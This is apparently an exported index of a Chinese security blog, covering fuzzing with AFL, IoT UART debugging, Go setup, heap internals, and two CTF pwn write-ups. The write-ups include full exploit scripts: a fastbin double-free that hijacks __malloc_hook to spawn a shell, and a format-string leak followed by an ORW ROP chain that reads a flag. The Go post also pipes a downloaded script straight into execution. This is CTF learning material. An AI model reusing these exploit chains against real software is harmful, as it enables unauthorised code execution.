[{"title":"fuzzing101","date":"2022-09-11T12:54:33.000Z","path":"2022/09/11/fuzzing101/","text":"对fuzzing101这个项目的简记exercise3cd $HOME mkdir fuzzing_tcpdump &amp;&amp; cd fuzzing_tcpdump/ # 下载并解压 tcpdump-4.9.2.tar.gz wget https://github.com/the-tcpdump-group/tcpdump/archive/refs/tags/tcpdump-4.9.2.tar.gz tar -xzvf tcpdump-4.9.2.tar.gz # 我们还需要下载 TCPdump 需要的跨平台库 libpcap。下载并解压 libpcap-1.8.0.tar.gz： wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.0.tar.gz tar -xzvf libpcap-1.8.0.tar.gz # 我们需要重命名libpcap-libpcap-1.8.0为libpcap-1.8.0. 否则，tcpdump 找不到libpcap.a本地路径： （实操下来好像没啥用，我最终显示的版本不是这个，有可能是因为我之前的环境残留问题） mv libpcap-libpcap-1.8.0/ libpcap-1.8.0 # 构建并安装 libpcap： cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/ ./configure --enable-shared=no make # 现在，我们可以构建和安装 tcpdump： cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/ ./configure --prefix=\"$HOME/fuzzing_tcpdump/install/\" make make install # 要测试一切是否正常，只需键入： $HOME/fuzzing_tcpdump/install/sbin/tcpdump -h 这个存在一些问题，就是我没用afl++重新编译之前，版本都是最新版，不知道存在啥问题 运行实例 $HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r ./tests/geneve.pcap 在启用 ASan 的情况下构建现在我们将构建启用 ASAN 的 tcpdump（和 libpcap）。 首先，我们要清理所有之前编译的目标文件和可执行文件： rm -r $HOME/fuzzing_tcpdump/install cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/ make clean cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/ make clean 现在，我们AFL_USE_ASAN=1在调用configureand之前设置make： cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/ export LLVM_CONFIG=\"llvm-config-11\" CC=afl-clang-lto ./configure --enable-shared=no --prefix=\"$HOME/fuzzing_tcpdump/install/\" AFL_USE_ASAN=1 make cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/ AFL_USE_ASAN=1 CC=afl-clang-lto ./configure --prefix=\"$HOME/fuzzing_tcpdump/install/\" AFL_USE_ASAN=1 make AFL_USE_ASAN=1 make install afl-clang-lto 编译可能需要几分钟才能完成 fuzz现在，您可以使用以下命令运行模糊器： afl-fuzz -m none -i $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/tests/ -o $HOME/fuzzing_tcpdump/out/ -s 123 -- $HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r @@ 意料之外的事发生事，我这里没有crash，十分的尴尬","link":"","categories":[],"tags":[{"name":"fuzz","slug":"fuzz","permalink":"https://torebtr.github.io/tags/fuzz/"}]},{"title":"FUZZ","date":"2022-08-11T14:18:21.648Z","path":"2022/08/11/FUZZ/","text":"FUZZ模糊测试工具主要分为两类，分别是变异测试以及生成测试 预处理需要搜集目标相关信息（输入格式、内部结构），指定模糊测试的策略 通常依赖于插桩、符号执行以及污点分析这类程序分析技术 分析技术与信息获取插桩向目标代码的合适位置添加预设好的代码，获取程序的静态或者动态执行信息 静态插桩在源码或者中间代码的编译过程中进行插桩 如：通过gcc在汇编语言上插桩，或者通过LLVM在生成的中间语言上插桩 依赖源码 动态插桩利用qemu等模拟技术进行插桩，获取程序的运行时信息 符号执行将程序行为的推理归结为逻辑领域的推理，通过构建一个表示程序执行的逻辑公式，可以同时推断一个程序在不用输入上的行为。 静态符号执行通常会因为循环和递归的存在陷入路径爆炸当中，还会因为hash之类操作的存在导致约束求解失败。 动态符号执行动态符号通过对程序进行实际执行和符号化执行，维护程序的实际状态和符号化状态，通过将难以求解的约束替换为实际值，缓解静态符号执行的问题，并按照深度优先的策略对于目标程序进行探索 污点分析污点分析技术会观测程序中哪些数据受到预置污染源（如输入）的污染，目的是跟踪污染源和汇聚点（如敏感数据）之间的信息流 静态污点分析获取程序控制流图、抽象语法树等信息，依据数据流以及依赖关系精选污点分析。 动态污点分析插桩编译afl-gcc -g -o test test.c 然后创建两个文件夹fuzz_in和fuzz_out fuzz_in文件夹内需要创建一个testcase文件，随便输入一点内容即可，比如aaa 开始fuzz可以直接从stdin读取输入的目标 ./afl-fuzz -i fuzz_in -o fuzz_out ./test 可从文件读取输入的目标程序 ./afl-fuzz -i fuzz_in -o fuzz_out ./test @@ 重点关注的信息uniq crashes 崩溃的次数 last new path 最近的一次新路径，方便判断是否陷入死循环 分析crashcrasher文件夹是产生crash的样例，hangs是产生超时的样例，queue里面是每个不同执行路径的测试用例 xxd [crash文件名] 无源码fuzzgcc -g -o test test.c afl-fuzz -i fuzz_in -o fuzz_out -Q ./test2","link":"","categories":[],"tags":[{"name":"fuzz","slug":"fuzz","permalink":"https://torebtr.github.io/tags/fuzz/"}]},{"title":"iot","date":"2022-04-13T14:08:40.000Z","path":"2022/04/13/iot/","text":"iot安全入门硬件安全硬件安全技术硬件安全框架 安全生命周期管理 测试调试端口保护 固件安全 可信执行环境 物理攻击技术 侧信道攻击技术（SCA） 故障注入攻击技术（FA） 侵入式攻击技术（IA） 组合攻击技术 面向软件安全的硬件攻击 软件流程保护 安全指令扩展 远程代码认证 虚拟化 可信启动 硬件安全和抗攻击技术 侧信道攻击防护技术 故障攻击防护技术 随机数发生器 物理不可克隆函数 安全版图设计 硬件安全防护PUF（Physical Unclonable Function）PUF是一种硬件安全技术，使用硅来区分芯片并创建一个唯一的随机数。生成的随机数用于加强设备ID和加密密钥以创建信任根。用作半导体设备（如微处理器）的唯一身份。 TPM (Trusted Platform Module)TPM可信平台模块，是一种植于计算机内部为计算机提供可信根的芯片，该芯片的规格由可信计算组（Trusted Computing Group）来制定。可用于存储、管理BIOS开机密码以及硬盘密码，TPM安全芯片可以进行范围较广的加密并用于加密硬盘的任意分区。它还包括远程认证和密封存储等功能，过通常需要部署到更高端的物联网设备上。 HSM（hardware security module）硬件安全模块是一个安全的加密处理器，专注于提供加密密钥，并通过这些密钥提供加密操作。该模块充当信任锚，通过确保对各种应用程序进行严格的加密、解密和身份验证，为身份、应用程序和事务提供保护。硬件安全模块具有物理防篡改、强认证等保护功能。 硬件安全模块系统不易受到损坏和系统故障的影响，系统的示例包括物理屏蔽的LAN设备，智能卡和PCI插件卡等，具有许多独特的优势，包括： 提供符合安全标准的认证 双重控制访问保护 负载分配和可靠性 支持所有标准密码算法 每秒几笔交易 仅需一个硬件安全模块即可提高密钥的可用性 模块中存在的软件和硬件专门用于安全功能 TrustZone信任区域是另一种将执行空间划分为安全和不安全区域的单芯片解决方案，不安全的应用程序不允许访问安全关键资产。这些相同的安全关键资产是隔离的不会被篡改。 硬件工具示波器、编程器、逻辑分析仪、万用表、电烙铁、usb转TTL 示波器常用来针对NFC的侧信道、边信道攻击，边信道攻击是针对加密电子设备在运行过程中的时间消耗、功率消耗或电磁辐射之类的侧信道信息泄露而对加密设备进行攻击的方法 编程器编程器为可编程的集成电路写入数据的工具,编程器主要用于单片机（含嵌入式）/存储器(含BIOS)之类的芯片的编程（或称刷写）。编程器主要修改只读存储器中的程序，编程器通常与计算机连接，再配合编程软件使用。 逻辑分析仪逻辑分析仪是分析数字系统逻辑关系的仪器。逻辑分析仪是属于数据域测试仪器中的一种总线分析仪，即以总线（多线）概念为基础，同时对多条数据线上的数据流进行观察和测试的仪器，这种仪器对复杂的数字系统的测试和分析十分有效。逻辑分析仪是利用时钟从测试设备上采集和显示数字信号的仪器，最主要作用在于时序判定。由于逻辑分析仪不像示波器那样有许多电压等级，通常只显示两个电压（逻辑1和0），因此设定了参考电压后，逻辑分析仪将被测信号通过比较器进行判定，高于参考电压者为High,低于参考电压者为Low，在High与 Low之间形成数字波形。 万用表 万用表作用： 识别未知的引脚 找到UART的接地引脚 检查哪些组件已连接 搞清楚您需要什么样的电源 检查接口上的电压以确保不会造成事故 电烙铁 选择电烙铁可以按以下两种方式来选择： 1、电烙铁加热形式的选择 (1)内热式和外热式的选择：相同瓦数情况下，内热式电烙铁的温度比外热式电烙铁的温度高。 (2)当需要低温焊接时，应用调压器控制电烙铁的温度，电烙铁的温度与电源电压有密切的关系，实际使用中 往往通过调低电源电压来降低电烙铁的温度。 (3)通过调整烙铁头的伸出长度控制温度。 (4)稳定电烙铁温度的方法主要有以下几种：加装稳压电源，防止供电网的变化；烙铁头保持一定体积、长度 和形状；采用恒温电烙铁；室内温度保持恒定；避免自然风或电扇风等。 2、按电烙铁功率的选择 (1)焊接小瓦数的阻容元件、晶体管、集成电路、印制电路板的焊盘或塑料导线时，宜采用30~45W的外热式 或20W的内热式电烙铁。应用中选用20W内热式电烙铁最好。 (2)焊接一般结构产品的焊接点，如线环、线爪、散热片、接地焊片等时，宜采用75~100W电烙铁。 (3)对于大型焊点，如焊金属机架接片、焊片等，宜采用100~200W的电烙铁。 USB转TTL USB转TTL模块的作用就是把电平转换到双方都能识别进行通信。 单片机通信接口的电平zhi逻辑dao和PC机通信接口的电平逻辑不同，PC机上的通信接口有USB接口，相应电平逻辑遵照USB原则；还有DB9接口（九针口），相应电平逻辑遵照RS-232原则。 单片机上的串行通信通过单片机的RXD、TXD、VCC、GND四个引脚，相应电平逻辑遵照TTL原则。 接口调试与漏洞利用部分通信接口介绍通信接口介绍-UART（通用异步接收器发送器）通用异步收发传输器（Universal Asynchronous Receiver/Transmitter），通常称作UART。 UART 允许两个硬件外围设备之间的异步串行通信。它们可以位于同一块电路板上（例如微控制器与电机或LED屏幕通信），也可以位于两个不同的设备之间（例如设备微控制器与PC通信）。它可以允许通过串行读取/写入设备。 在许多物联网设备中，板上的UART端口保持打开状态，任何人都可以通过串口连接和访问以获得shell，日志输出等。设备在通常情况下会带有一组引脚，当我们连接到微控制器UART RX和TX引脚时，便可用于发送和接收串行数据。 UART引脚作用介绍： VCC：供电pin，一般是3.3v-5v，正极 GND：接地，负极 RXD：接收数据引脚 TXD：发送数据引脚 通信接口介绍- JTAG（微控制器调试接口）JTAG属于微控制器调试接口。微控制器具有在运行期间使用指定引脚进行调试的规定，这些引脚连接到电路板上的引脚。这些引脚（端口）由开发人员和设计人员用于调试，读/写固件和微控制器内部存储器，生产后控制/测试微控制器引脚。这使得调试端口成为最关键的攻击面之一，因为它为攻击者提供了强大的功能和访问权限。除了JTAG之外，还包括cJTAG、SWD。 寻找UART串口方法调试UART设备前首先找到在板子上找到相应的引脚: 若已有明确标识引脚的板子，可以直接使用USB转TTL工具按照下图连接方式进行连接: 1、GND引脚对应TTL的GND 2、RXD引脚对应TTL的TXD 3、TXD引脚对应TTL的RXD 若PCB板子上没有明确标识出引脚的设备，还需要通过其它方法确定UART接口: 可以在PCB板上寻找并排的焊点或者通孔，常规来说数量大约为3-5个的通孔可来作为UART调试串口的初步定位。 1、定位GND将万用表扭至蜂鸣档，将一只表笔抵住电源焊锡点，另一个表笔抵住通孔位置进行测试，发出蜂鸣声的通孔，就可以初步判定为GND。 2、定位VCC 因已知VCC电压为3.3V,将万用表扭至20V上，将一只表笔放置于GND上，另一只表笔依次对其它通孔进行测试，查看哪个是电压3.3V,发现有两个引脚均为3.3V。 因两个脚同时为3.3V或5V，所以我们利用VCC+GND 正负极相连短路来最终确定VCC引脚，我们将一根插线，接入GND，另一个端对两个均为3.5V的通孔进行测试，发现连接到第二个孔时，电源灯灭，故确定该通孔即为VCC引脚。 3、定位TXD 根据经验每次开机有数据传输的时候该引脚电压都会发生变化来判断TXD引脚即可，将表笔置于剩余未确定的口中重启设备观察电压变化即可。 4、定位RXD 其他三个引脚定位完毕，剩下的就是RXD引脚…. 定位完毕后使用USB转TTL工具按照顺序接入电脑即可 打开SecureCRT-选择Serial-COM口-波特率即可连接到UART串口","link":"","categories":[],"tags":[{"name":"iot","slug":"iot","permalink":"https://torebtr.github.io/tags/iot/"}]},{"title":"go入门","date":"2022-03-03T08:20:05.007Z","path":"2022/03/03/go入门/","text":"golang入门前言go语言越来越火，加上会python的越来越多，再不多学一门语言就要失业了，所以开始学了点go，简单记录一下入门的过程 环境配置这里简单介绍一下我的环境是如何配的。 go安装安装包下载地址为：https://golang.org/dl/。 如果打不开可以使用这个地址：https://golang.google.cn/dl/。 atom配置go-plus插件安装 go-plus是Atom上面的一款开源的Golang开发环境插件，项目地址: https://github.com/joefitzgerald/go-plus 他需要依赖一些的Golang工具: autocomplete-go ：gocode的代码自动提示 gofmt ：使用goftm,goimports,goturns builder-go: go-install 和go-test,验证代码，给出建议 gometalinet-linter: goline,vet,gotype的检查 navigator-godef: godef tester-goo : go test gorename : rename工具 这些依赖工具在安装go-plus的时候会自动安装 在Atom中的Preference中可以找到install菜单,输入go-plus即可安装go-plus 具体环境配置参考：https://www.jianshu.com/p/c1d8cf274ec7 命令行我起初想使用atom，但是我的atom上快捷键太多，容易重复，我也没搞，直接使用的命令行运行，编辑器使用的是vim。 安装scoop在PowerShell中执行下面的命令，赋予PowerShell执行脚本的权限： Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser 在PowerShell中运行下面的命令安装scoop： Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://get.scoop.sh') 或者下面的短命令： iwr -useb get.scoop.sh | iex 安装vimscoop install vim 然后就可以在powershell中使用vim了 至于terminal美化建议读者自行探索 到此，环境配置结束，无论是否使用atom，都可以用命令行直接运行程序 go语言结构Go Hello World 实例Go 语言的基础组成有以下几个部分： 包声明 引入包 函数 变量 语句 &amp; 表达式 注释 package main //包声明，每个 Go 应用程序都包含一个名为 main 的包 import \"fmt\" //引入包诉 Go 编译器这个程序需要使用 fmt 包（的函数，或其他元素） func main() { // func main() 是程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数）。 fmt.Println(\"Hello, World!\") } 执行","link":"","categories":[],"tags":[]},{"title":"队内练习","date":"2021-10-31T06:01:23.000Z","path":"2021/10/31/队内练习/","text":"队内组建了pwn小组，不定时更新题目 湖湘杯_2019_namesystem这是一道湖湘杯的题目，比较简单，但是由于我水平比较菜，还是花了一段时间来复现 准备 64位程序，pie没开 ida反编译 是一个经典菜单题，但是show函数不能用 add函数 限制了申请的chunk的大小在16-96之间，为fast_bin范围 drop函数 将指针free然后清空，无uaf，但存在逻辑漏洞 当free id为0的chunk时， free后，id为18的chunk就和id为19的chunk是同一个chunk了 当free id为18的chunk时，free后，id为18的chunk就和id为19的chunk是同一个chunk了 申请20个chunk delete 18 可以看到当我们删除18时，19的chunk地址没变，而且18变成和19一样的chunk。 delete(0) 可以发现，只要我们 不删除19，并且19不为空，当我们删除19前面的chunk时，chunk地址都会前移，并且18也会变成和19一样的地址 解题思路构造double链，将free_got改为printf，然后利用格式化字符串泄露libc基址，再构造double链打malloc_hook，将____malloc_hook改为onegadget，然后getshell，注意此处需要通过 realloc_hook 调整栈帧使 onegadget 生效 exp#coding:utf8 from pwn import * context.log_level=\"debug\" p = process('./namesystem') elf = ELF('./namesystem') libc = ELF('libc-2.23.so') printf_plt = elf.plt['printf'] def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Name Size:',str(size)) p.sendlineafter('Name:',content) def delete(index): p.sendlineafter('Your choice :','3') p.sendlineafter('The id you want to delete:',str(index)) #info ptr[20] : 0x6020A0 for i in range(17): add(0x10,'a'*0x10) #gdb.attach(p) add(0x50,'b'*0x30)#17 add(0x20,'a'*0x20)#18 #temp add(0x50,'c'*0x30)#19 #gdb.attach(p) #got表上伪造一个chunk fake_chunk_addr = 0x0601FFA delete(18)#19位置的指针移到18后没有清零 #gdb.attach(p) delete(19) #19 delete(17) #17 delete(17) #19 #gdb.attach(p) add(0x50,p64(fake_chunk_addr)) #17 #gdb.attach(p) for i in range(17):#ptr结构体数组有限制需要将他们delete进fastbin中 delete(0) #gdb.attach(p) add(0x50,'b'*0x30) #18 add(0x50,'b'*0x30) #18 #gdb.attach(p) for i in range(17-3): add(0x10,\"a\"*0x10) add(0x60,\"a\"*0x68)# 17 add(0x20,\"a\"*0x68)# 18 add(0x60,\"a\"*0x68)# 19 delete(18)#19位置的指针移到18后没有清零 delete(19) #19 delete(17) #17 delete(17) #19 for i in range(17): delete(3) #gdb.attach(p) add(0x50,\"a\"*0xe+p64(printf_plt)[0:6]) #19 #print('print:',str(printf_plt)[0:6]) #gdb.attach(p) add(0x28,\"%13$p\")#4 delete(4)#printf(\"%13$p\") libc_base = int(p.recvuntil('Done!',drop = True),16) - 240 - libc.sym['__libc_start_main'] print \"libc_base : \"+hex(libc_base) malloc_hook_addr = libc_base + libc.symbols['__malloc_hook'] one_gadget_addr = libc_base + 0x4527a#local #remote_one=[0x45216,0x4526a,0xf02a4,0xf1147] #one_gadget_addr = libc_base + remote_one[1] realloc_addr = libc_base + libc.sym['realloc'] print 'libc_base=',hex(libc_base) print 'malloc_hook_addr=',hex(malloc_hook_addr) print 'one_gadget_addr=',hex(one_gadget_addr) #gdb.attach(p) add(0x60,p64(malloc_hook_addr - 0x23)) #4 add(0x60,'b'*0x60) #5 #gdb.attach(p) add(0x60,'c'*0x60) #6 #gdb.attach(p) #写malloc_hook add(0x60,'\\x00'*0xB + p64(one_gadget_addr) + p64(realloc_addr + 0x10)) gdb.attach(p) #add(0x60,'\\x00'*0xB + p64(one_gadget_addr) + p64(realloc_addr + 0x10)) #getshell p.sendlineafter('Your choice :','1') p.sendlineafter('Name Size:','18') p.interactive() exp详解在这里解释一下exp的以及payload的构造，顺便复习一下 简单的chunk申请，这里没有什么要说的，只需要注意后三个chunk的大小就可以，17与19一致即可 关于这个fake_chunk，因为我们要修改free的got表，所以fake_chunk在free_got附近 存在可用size，所以用这个地址 ps： 这个地址也可以 利用 realloc_hook 调整栈帧的payload，其中’a’*11为固定值，后面的12/0x10可变，可以自己尝试 'a'*11 + p64(onegadget) + p64(realloc+12) + '\\n' 'a'*0xB + p64(one_gadget_addr) + p64(realloc_addr + 0x10)","link":"","categories":[{"name":"heap","slug":"heap","permalink":"https://torebtr.github.io/categories/heap/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://torebtr.github.io/tags/pwn/"}]},{"title":"pwn_lua","date":"2021-10-29T15:41:52.000Z","path":"2021/10/29/记一次lua/","text":"记一道lua题目这道题是队内一个师傅发的，因为之前没有接触过lua方面的题目，这道题又不是特别难，所以记一下来入门。特此鸣谢ymt师傅和eur1ka师傅 https://github.com/Torebtr/ctf/tree/main/lua 环境这个题目比较特殊，除了基本的libc环境，还需要liblua.so动态文件，这就要自行编译了 https://www.lua.org/ftp/ 从上面的网站下载lua源码，扔到ubuntu中，然后修改makefile 第一步：修改根目录下的MakefileTO_LIB= liblua.a #==&gt;&gt; TO_LIB= liblua.a liblua.so 第二步：修改src/MakefileCFLAGS增加-fPIC选项新增目标输出位置大概是随意，或者添加到与lua.o紧邻的位置 LUA_SO= liblua.so 修改ALL_T值##原文件 ALL_T= $(LUA_A) $(LUA_T) $(LUAC_T) #==&gt;&gt; ALL_T= $(LUA_A) $(LUA_T) $(LUAC_T) $(LUA_SO) 增加动态库的编译依赖关系$(LUA_SO): $(CORE_O) $(LIB_O) $(CC) -o $@ -shared $? -ldl -lm 参考博客 然后将编译出来的文件扔到/lib/x86_64-linux-gnu目录下即可 题目分析装完环境后可以直接运行文件，是下面图片中的样子 进入正题，先查看基本信息 基本信息 保护全开，在我的印象里，这种保护全开的大概是堆题，好巧不巧，这是一道栈题，主要难点在于栈迁移，好嘛，又是一个我不熟悉的知识点，来吧。 ida反编译main函数 用处不是很大，但是会发现调用了ezcmd.lua这个文件 login函数 非常重要的函数，会发现他有格式化字符串漏洞和栈溢出漏洞 格式化字符串这部分主要是用来泄露libc基址和canary的 在此解释一下接下来exp中的部分语句： p.sendline(\"%107$p##%11$p\") 这个分为两部分： 第一部分是%107$p 107的来源ymt师傅在他的exp中写的是 但是在我调试的过程中发现不是这一个 因为很容易发现，计数是从2开始的，01为我们输入的参数 又因为64位程序前六个参数由寄存器传递，所以0x65+6=107 这样我们可以泄露libc基址 第二部分是%11$p 这一块很好理解，canary在rbp-8处 直接调试就可发现是5+6=11 此处的6还是寄存器 这样两个格式化字符串的参数就很好解释了。 栈溢出这个题的难点在于要构造orw，因为开启了沙箱 因为有栈溢出，但是不能直接调用getshell的函数，所以可以写orw，两种思路，一种是写在free_hook上，另一种就是在.bss段上找一块可读可写可执行的区域，应该是都可以。 exp#coding:utf8 from pwn import * context.log_level=\"debug\" p=process(\"./pwn3\") #p = remote(\"10.103.16.3\",80)#2 3 5 6 10 elf=ELF(\"./pwn3\") libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") p.recvuntil(\"$ \") p.sendline(\"login\") p.recvuntil(\"user:\") #gdb.attach(p) p.sendline(\"%107$p##%11$p\") ''' 66:0330│ 0x7fffffffde18 —▸ 0x7ffff7d7f0b3 (__libc_start_main+243) ◂— mov edi, eax pwndbg&gt; p 0x330/8+5 5--&gt;寄存器数量 $1 = 107 65:0328│ 0x7ffdee745618 —▸ 0x7ff3607fc0b3 (__libc_start_main+243) ◂— mov edi, eax pwndbg&gt; p 0x328/8+6 $2 = 107 pwndbg&gt; p 0x65+6 0x66+5 $2 = 107 06:0030│ 0x7fffffffdb18 ◂— 0x382ce7b98064fd00 07:0038│ rbp 0x7fffffffdb20 —▸ 0x5555555592a8 ◂— 0x0 canary rbp-8 6+5 ''' p.recvuntil(\"0x\") libc_base=int(p.recv(12),16) print \"libc_base : \"+hex(libc_base) libc_base=libc_base-243-libc.sym['__libc_start_main'] print \"libc_base : \"+hex(libc_base) p.recvuntil(\"##0x\") canary=int(p.recv(16),16) print \"canary : \"+hex(canary) p.recvuntil(\"passwd:\") #gdb.attach(p) #main_addr= sys_addr = libc_base+libc.symbols['system'] sh_addr = libc_base+libc.search('/bin/sh').next() pop_rdi_ret = libc_base+0x26b72 #$ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search \"pop|ret\" | grep rdi print \"sys_addr : \"+hex(sys_addr) print \"sh_addr : \"+hex(sh_addr) print \"pop_rdi_ret : \"+hex(pop_rdi_ret) print \"one : \"+hex(libc_base+0xe6c7e) ''' #pd = 'a'*0x18+p64(canary)+p64(0xdeadbbef)+ p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr) #pd = 'a'*0x18+p64(canary)+p64(0xdeadbbef)+ p64(libc_base+0xe6c7e)#0xe6c81 0xe6c84 #pd = 'a'*0x18+p64(canary)+p64(0x7f09f76371e3)+ p64(0x7f09f76371e3)#0xe6c81 0xe6c84 #p.sendline(pd) ''' open_addr=libc_base+libc.symbols['open'] read_addr=libc_base+libc.symbols['read'] puts_addr=libc_base+libc.symbols['puts'] __free_hook=libc_base+libc.symbols['__free_hook']#libc.symbols['__free_hook']#0x1eb000(no ok) pop_rdx_ret=libc_base+0x11c371 #0x000000000011c371: pop rdx; pop r12; ret; pop_rsi_ret=libc_base+0x27529 leave_ret=libc_base+0x5aa48 print \"open_addr is \"+hex(open_addr) print \"read_addr is \"+hex(read_addr) print \"free_hook is \"+hex(__free_hook) print \"pop_rdi_ret is \"+hex(pop_rdi_ret) print \"pop_rdi_ret is \"+hex(pop_rdi_ret) print \"pop_rsi_ret is \"+hex(pop_rsi_ret) print \"leave_ret is \"+hex(leave_ret) pd='a'*0x18+p64(canary)+p64(__free_hook) pd+=p64(pop_rsi_ret)+p64(__free_hook+0x8)+p64(pop_rdi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0x100)+p64(0)+p64(read_addr)+p64(leave_ret) #gdb.attach(p) p.send(pd) pd=p64(pop_rdi_ret)+p64(__free_hook+0xa0)+p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0x0)+p64(0)+p64(open_addr) ##open(\"file_addr\",oflag) 72 0 pd+=p64(pop_rsi_ret)+p64(__free_hook+0x100)+p64(pop_rdi_ret)+p64(3)+p64(pop_rdx_ret)+p64(0x100)+p64(0)+p64(read_addr) #read(fd,*buf,100) pd+=p64(pop_rdi_ret)+p64(__free_hook+0x100)+p64(puts_addr) #puts() pd+=\"./flag\\x00\" p.send(pd) print \"len=&gt;\",hex(len(pd)) p.interactive()","link":"","categories":[{"name":"heap","slug":"heap","permalink":"https://torebtr.github.io/categories/heap/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://torebtr.github.io/tags/pwn/"}]},{"title":"heap学习(乱)","date":"2021-08-31T06:28:26.000Z","path":"2021/08/31/heap-乱/","text":"堆学习记录这一块只是随便记一下，写的特别乱，如果有需要可以自己翻阅 patchelf使用patchelf --replace-needed libc.so.6 /lib/x86_64-linux-gnu/2.23-0ubuntu11.3_amd64/libc-2.23.so ./pwn patchelf --set-interpreter ld-2.23.so --set-rpath /lib/x86_64-linux-gnu/2.23-0ubuntu11.3_amd64 ./pwn exp模板# encoding=utf-8 from pwn import * from LibcSearcher import * s = lambda buf: p.send(buf) sl = lambda buf: p.sendline(buf) sa = lambda delim, buf: p.sendafter(delim, buf) sal = lambda delim, buf: p.sendlineafter(delim, buf) shell = lambda: p.interactive() r = lambda n=None: p.recv(n) ra = lambda t=tube.forever:p.recvall(t) ru = lambda delim: p.recvuntil(delim) rl = lambda: p.recvline() rls = lambda n=2**20: p.recvlines(n) libc_path = \"/lib/x86_64-linux-gnu/libc-2.23.so\" elf_path = \"./2a1\" ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so') libc = ELF(libc_path) elf = ELF(elf_path) #p = remote(\"node3.buuoj.cn\",26000) context.log_level = 'debug' #p = process([elf_path],env={\"LD_PRELOAD\":libc_path}) 堆入门https://blog.csdn.net/qq_41453285/article/details/97613588 fastbinfastbins为单链表存储。unsortedbin、smallbins、largebins都是双向循环链表存储。 并且free掉的chunk，如果大小在0x20~0x80之间会直接放到fastbins上去，大于0x80的会放到unsortedbin上，然后进行整理。 fastbins是单向链表存储 fastbins的存储采用后进先出（LIFO）的原则：后free的chunk会被添加到先free的chunk的后面；同理，通过malloc取出chunk时是先去取最新放进去的。 fastbins中的所有chunk的bk是没有用到的 并且fastbins比较特殊，一个fastbin链第一个chunk指向于一个特殊的“0”，然后后面接的是后free的chunk……以此类推，最后一个chunk再由arena的malloc_state的fastbinsY数组所管理 unsortedbin free的chunk大小如果大于0x80会放到unsortedbin上。 unsortedbin存储这些chunk是使用双向循环链表进行存储的 // 一个 chunk 的完整结构体 struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; // 正在使用的 chunk 布局 chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if allocated | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . . | nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 由malloc申请的内存空间被称作chunk,而当程序申请的chunk被free时会被加入到相应的空闲管理列表(bin)中 pre_size：前一个chunk块的大小，如果chunk_size的P位为1则pre_size无效，上个chunk可以使用pre_size的空间。（前一个chunk块的大小，指的是低地址的chunk） chunk_size:当前chunk的大小，由于chunk是8字节对齐的，所以后3位分别为，A(是否为main_arena,即主线程)、M(该chunk是否由mmap分配)，P(前一个chunk是否被分配，故经常会看到chunk_size比chunk大1字节)。 mem：用户申请的空间，即malloc 申请得到的内存指针，其实指向 mem 的起始处。chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下fd 指向下一个（非物理相邻）空闲的 chunkbk 指向上一个（非物理相邻）空闲的 chunk通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理 大小：Chunk的大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 故在32位中最小的chunk(min_size)的大小为：8+4+4=16字节,其中8字节为用户使用的空间，4字节为pre_size,4字节为chunk_size 64位为：16+8+8=32字,16字节为用户使用的空间，8字节为pre_size,8字节为chunk_size（最小的chunk意味着只要用户申请的size小于min_size，得到的空间都为min_size） 请求分配 chunk 大小分配公式是 chunk_size = (用户请求大小 + (2 - 1) * sizeof(INTERNAL_SIZE_T)) align to 2 * sizeof(size_t) 空闲管理列表(bin):用户释放掉的 chunk 不会马上归还给系统，ptmalloc会统一管理 heap 和 mmap 映射区域中的空闲的chunk。在具体的实现中，ptmalloc 采用分箱式方法对空闲的chunk 进行管理。首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为4类：fast bins，small bins，large bins，unsorted bin。每类中仍然有更细的划分，相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 